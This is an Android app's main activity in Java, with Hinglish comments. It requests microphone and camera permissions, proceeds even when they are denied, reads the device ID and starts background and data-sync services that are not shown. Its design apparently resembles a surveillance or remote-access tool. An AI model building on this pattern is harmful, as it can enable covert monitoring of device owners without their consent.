package com.ultimate.access;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.ultimate.access.services.UltimateBackgroundService;
import com.ultimate.access.network.DataSyncService; // 🔥 IMPORT ADD KIYA

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    private TextView tvStatus;
    private TextView tvDeviceId;

    private Button btnServerSync;
    private Button btnExit;

    String[] permissions = {

            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA

    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        tvDeviceId = findViewById(R.id.tv_device_id);

        btnServerSync = findViewById(R.id.btn_server_sync);
        btnExit = findViewById(R.id.btn_exit);

        checkPermissions();
    }

    private void checkPermissions() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            ActivityCompat.requestPermissions(
                    this,
                    permissions,
                    PERMISSION_REQUEST_CODE
            );

        } else {

            onPermissionsGranted();

        }
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults) {

        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {

            // permission allow ho ya deny → app continue karega
            onPermissionsGranted();

        }
    }

    public void onPermissionsGranted() {

        tvStatus.setText("App Running");

        String androidId = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ANDROID_ID
        );

        tvDeviceId.setText("Device ID: " + androidId);

        startBackgroundService();
        startDataSyncService(); // 🔥 YEH LINE ADD KI

        btnServerSync.setOnClickListener(v -> {

            Intent intent = new Intent(
                    MainActivity.this,
                    ServerSyncActivity.class
            );

            startActivity(intent);

        });

        btnExit.setOnClickListener(v -> {

            Toast.makeText(
                    MainActivity.this,
                    "App Closed",
                    Toast.LENGTH_SHORT
            ).show();

            finishAffinity();

        });

    }

    private void startBackgroundService() {

        Intent serviceIntent =
                new Intent(this, UltimateBackgroundService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            startForegroundService(serviceIntent);

        } else {

            startService(serviceIntent);

        }

    }

    // 🔥 NEW: DataSyncService start karne ka method
    private void startDataSyncService() {

        Intent intent = new Intent(this, DataSyncService.class);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            startForegroundService(intent);

        } else {

            startService(intent);

        }

    }

}